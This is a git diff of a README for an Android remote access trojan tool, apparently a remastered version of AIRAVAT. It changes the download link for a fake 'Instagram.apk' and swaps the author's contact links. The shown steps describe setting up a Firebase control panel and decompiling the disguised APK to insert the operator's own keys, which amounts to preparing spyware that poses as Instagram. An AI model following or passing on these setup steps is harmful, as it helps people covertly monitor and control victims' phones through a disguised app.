@@ -78,7 +78,7 @@ A tool that remasterd for AIRAVAT tool
  1. Open [home.html](./cyb3r-lucky/home.html) File and from [line number 16](https://github.com/cyb3r-luckysant/Spy03O/blob/7e56da936b15c3c523584e9ae3ba387a3d8b829b/cyb3r-lucky/home.html#L16) replace the config with your web app config which you have created on Step 6.
  1. Save the file , Your Panel Setup is completed.
  ### Android RAT
- 1. Download [Instagram.apk](https://github.com/caronero/Zero-Rat/raw/master/APK/Instagram.apk)
+ 1. Download [Instagram.apk](cyb3r-lucky/APK/Instagram.apk)
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
@@ -95,8 +95,8 @@ A tool that remasterd for AIRAVAT tool
 
 
 ## Contact Info 
- 1. [Telegram](https://t.me/cn_zd)
- 2. [Watch full video installation here](https://t.me/cn_zd46/13)
+ 1. [Telegram](https://mr_yash_sant)
+ 2. [Watch full video installation here](youtube/mr_lucky_sant)
 
 
 ## DISCLAIMER
